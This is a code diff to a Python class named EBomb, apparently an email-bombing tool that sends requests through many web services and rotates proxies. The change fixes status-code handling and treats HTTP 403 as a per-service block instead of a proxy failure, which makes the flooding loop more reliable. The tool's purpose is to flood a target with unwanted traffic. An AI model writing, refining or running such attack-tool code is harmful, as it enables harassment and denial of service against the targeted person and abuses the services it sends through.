@@ -108,8 +108,8 @@ class EBomb:
         except RequestException as Error:
             _markup.response = 'italic red'
             resp = self._repr.repr(Error)
-            code = Error.response
-        if service in services and code in (301, 308, 404, 405):
+            code = None if Error.response is None else Error.response.status_code
+        if service in services and code in (301, 308, 403, 404, 405):
             _markup.response = 'yellow'
             pos = services.index(service)
             if code in (301, 308):
@@ -121,6 +121,8 @@ class EBomb:
                 else:
                     _markup.service = 'yellow'
                     services.pop(pos)
+            elif code == 403:
+                _markup.service = 'italic red'
             elif code == 404:
                 _markup.service = 'red'
                 services.pop(pos)
@@ -132,7 +134,7 @@ class EBomb:
                 else:
                     _markup.method = 'italic red'
                     services.append(Service(service.url, 'GET'))
-        elif code in (None, 401, 403, 407):
+        elif code in (None, 401, 407):
             _markup.proxy = 'red'
             proxies = self.proxies
             if _proxy in proxies:
